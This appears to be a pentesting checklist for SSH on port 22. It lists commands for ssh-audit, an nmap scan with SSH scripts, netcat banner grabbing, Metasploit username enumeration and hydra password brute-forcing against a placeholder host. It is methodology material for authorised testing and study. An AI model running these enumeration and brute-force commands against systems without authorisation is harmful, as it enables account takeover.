# 22 - SSH

* [ ] 1\. **general checks SSH**

```bash
##### REFERENCE: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html?highlight=pentesting%20ssh#automated-ssh-audit
# 1. utilize ssh-audit for configuration auditing (https://github.com/jtesta/ssh-audit)
ssh-audit {{RHOST}}

# 2. nmap scan & banner grabbin
nmap -sC -sV -p 22 {{RHOST}} --script=ssh*
nc -vn {{RHOST}} 22

# 3. username enumeration
msf> use scanner/ssh/ssh_enumusers
```

* [ ] **2.  Bruteforce SSH**

```bash
### ---
# NOTE: if there is a website, extract (if applicable) users and passwords. Use that as a base for the wordlists
### ---

# 1. SSH
# 1A. username + password combination
# 1B. lowercase usernames + password combination
# 1C. -e snr = try 'blank' passwords, 'n' for username = password, 'r' for reversed username
hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -e nsr {{RHOST}} ssh
hydra -L <(tr A-Z a-z < users.txt) -P /usr/share/wordlists/fasttrack.txt -e nsr {{RHOST}} ssh
```
